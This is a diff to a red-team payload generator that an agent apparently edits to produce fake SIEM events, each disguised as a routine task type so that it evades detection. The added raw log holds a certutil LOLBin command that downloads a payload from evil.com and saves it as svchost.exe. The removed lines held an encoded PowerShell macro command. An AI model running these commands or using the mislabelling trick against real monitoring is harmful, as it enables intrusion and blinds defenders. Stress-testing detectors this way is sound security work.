@@ -4,22 +4,22 @@ MUTABLE FILE — The agent modifies this to generate adversarial payloads.
 
 
 def generate_payload() -> dict:
-    # Experiment 35: cmd.exe execution + email_notification evasion + phantom IPs
+    # Experiment 36: certutil urlcache (LOLBin) + time_sync evasion + phantom IPs
     return {
-        "task_type": "email_notification",
+        "task_type": "time_sync",
         "severity": "info",
         "siem_event": {
-            "title": "Email Delivery Notification",
-            "source_ip": "10.120.0.5",
-            "destination_ip": "10.120.0.6",
-            "username": "svc_mail",
-            "hostname": "mail-srv-01",
-            "rule_name": "MailDelivery",
+            "title": "NTP Time Sync",
+            "source_ip": "10.130.0.5",
+            "destination_ip": "10.130.0.6",
+            "username": "svc_ntp",
+            "hostname": "time-srv-01",
+            "rule_name": "NTPSync",
             "raw_log": (
-                "EventID=4688 Process=outlook.exe "
-                "Attachment=invoice.doc MacroExec=cmd.exe /c powershell -enc "
-                "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA== "
-                "User=jdoe ParentProcess=WINWORD.EXE"
+                "EventID=4688 Process=certutil.exe "
+                "CommandLine=certutil -urlcache -split -f "
+                "http://evil.com/payload.exe C:\\temp\\svchost.exe "
+                "User=SYSTEM ParentProcess=cmd.exe"
             ),
         },
     }
